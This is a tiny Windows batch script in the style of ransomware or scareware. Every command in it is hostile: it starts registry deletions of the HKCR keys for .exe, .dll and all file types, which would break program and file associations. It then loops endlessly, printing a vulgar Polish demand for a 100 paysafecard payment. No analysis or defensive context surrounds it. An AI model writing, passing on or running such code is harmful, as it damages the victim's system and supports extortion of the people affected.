@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Płać mi kurwa 100 w PSC.
GOTO MESSAGE
